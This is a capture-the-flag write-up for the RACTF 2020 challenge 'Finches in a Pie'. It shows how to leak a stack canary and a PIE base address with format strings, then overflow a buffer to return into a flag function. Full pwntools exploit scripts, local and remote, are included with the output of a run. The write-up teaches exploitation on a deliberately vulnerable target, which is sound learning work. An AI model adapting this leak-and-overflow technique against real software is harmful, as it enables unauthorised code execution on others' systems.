# Finches in a Pie

This challenge is very similiar to Finches in a Stack, so this one is more like a continuation of that writeup, so I'd advise reading that one first before reading this one. Here's the link:
[Finches in a Stack](https://github.com/crypt0n1te/write-ups/blob/master/ractf-2020/rev-pwn/finches_in_a_stack.md)

Protections:
First, let's check the protections that this binary has using checksec:
```
sasha@kali:~/RACTF$ pwn checksec fiap
[*] '/home/sasha/RACTF/fiap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So here's what we have to deal with:

* Canary: This is a protection that places a random value before a return pointer, so that if you overwrite it with an invalid value, the program crashes

* NX: This prevents us from executing our own shellcode by marking critical areas as non-executable

* ASLR: This will randomize addresses such as libc ones, such as system. This won't affect us however

And a new one:

* PIE: This essentially randomizes the addresses of the functions and gadgets, making returning to functions harder

Since this binary is practically the same as `fias`, I won't go over the reversing again

## Overview

Our exploit is going to have four parts again:

* Padding, to reach the canary
* Canary, to overwrite canary, so that the program doesn't crash
* More padding, to reach the return pointer
* Return Pointer, where we point back into 'flag'

We already have the other 4 sorted, however our new challenge is to find the return pointer, due to PIE randomizing it

## Leaking PIE

Fortunately, we can also leak a PIE address with format strings, this time it's `%12$p`. However, there are some calculations that need to be made to get the base address
Lets load up gdb and have a look at the functions:
```
0x00001209  flag
```
So now we have the offset of `flag`. Let's run it with a breakpoint at say_hi (as that's where input is taken):
```
gdb-peda$ b say_hi
Breakpoint 1 at 0x1287
gdb-peda$ r
```
Let's skip to the printf which we use to leak, entering `%12$p` in the `gets`:
```
gdb-peda$ 
0x56559000!
```
Now we need to find out what to do with this address to get the base address. Let's take a function, say the `flag` function, see where it is now after being randomized:
```
gdb-peda$ p flag
$1 = {<text variable, no debug info>} 0x56556209 <flag>
```
And using our offset from before
> 0x00001209
We will take the offset away from the flag address, to find the base:
```
gdb-peda$ p/x 0x56556209 - 0x1209
$2 = 0x56555000
```
So that's our base address, now we do:
```
gdb-peda$ p/x 0x56559000 - 0x56555000
$3 = 0x4000
```
To find the offset of the leaked PIE address. Now, using this information, we can always find the return pointer we need

## Local exploit

Now we can create our local exploit using python3 + pwntools. We send the two format strings in the same line, separated by a `-`, so we can leak the canary and PIE at one time:
```python
from pwn import *

e = ELF("fiap")
io = e.process()

for i in range(0,10):
	io.recvline()

io.sendline("-%11$p-%12$p-")		# Leak both canary and PIE
recieved = str(io.recvline()).split("-")
canary = int(recieved[1],16)
pie = int(recieved[2],16) - 0x4000	# Gets base
log.info("Canary: " + str(hex(canary)))
log.info("PIE: " + str(hex(pie)))
io.recvline()

flag = pie + 0x1209	# Base + Flag offset

payload = b"a" * 25		# Pads upto canary
payload += p32(canary)		# Overwrites canary
payload += b'bbbbccccdddd' 	# Pads upto return address
payload += p32(flag)		# Overwites return addr with addr of flag function

io.sendline(payload)
print(io.recvline().decode())
io.close()
```

## Transferring to remote

Transferring to remote is very simple once again:
```python
from pwn import *
import sys

args = sys.argv[1].split(":")
ip = args[0]
port = args[1]

io = remote(ip,port)

for i in range(0,10):
	io.recvline()

io.sendline("-%11$p-%12$p-")		# %11$lx leaks canary, %12$p leaks pie
recieved = str(io.recvline()).split("-")
canary = int(recieved[1],16)
pie = int(recieved[2],16) - 0x4000	# Leaked pie take 0x4000 results in binary base

log.info("Canary: " + str(hex(canary)))
log.info("PIE: " + str(hex(pie)))
io.recvline()

flag = pie + 0x1209

payload = b"a" * 25		# Pads upto canary
payload += p32(canary)		# Overwrites canary
payload += b'bbbbccccdddd' 	# Pads upto return address
payload += p32(flag)		# Overwites return addr with addr of flag function

io.sendline(payload)
print(io.recvline().decode())
io.close()
```
Let's now run it:
```
sasha@kali:~/RACTF$ python3 fiapremote.py 95.216.233.106:49276
[+] Opening connection to 95.216.233.106 on port 49276: Done
[*] Canary: 0x3132f200
[*] PIE: 0x565d6000
ractf{B4k1ng_4_p1E!}

[*] Closed connection to 95.216.233.106 port 49276
sasha@kali:~/RACTF$ 
```
Challenge done!
